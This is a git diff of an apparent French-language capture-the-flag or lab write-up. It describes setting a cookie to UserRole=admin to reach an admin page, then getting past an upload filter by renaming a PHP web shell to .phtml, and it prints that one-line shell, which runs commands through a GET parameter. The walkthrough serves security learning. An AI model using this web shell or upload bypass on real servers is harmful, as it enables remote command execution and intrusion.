@@ -135,6 +135,20 @@ Hypertext Transfer Protocol
     [Response in frame: 1335]
 ```
 
-En utilisant ce cookie on arrive sur cette page:
-![[IMG-20260211195554950.png]]
+En utilisant ce cookie et en mettant UserRole=admin, on arrive sur cette page:
+![[IMG-20260211201408823.png]]
+
+On tente d’uploader un fichier PHP classique (`shell.php`), mais le serveur refuse explicitement :
+![[IMG-20260211202154981.png]]
+
+Cela indique qu’un filtre bloque certaines extensions (probablement `.php` et `.html`).
+Cependant, ce type de filtrage est souvent incomplet et ne prend pas en compte d’autres extensions reconnues par Apache/PHP.  
+On peut alors contourner la restriction en utilisant une extension alternative interprétée comme du PHP
+
+shell.phtml
+```
+<?php system($_GET["cmd"]); ?>
+```
+
+![[IMG-20260211202508913.png]]
 
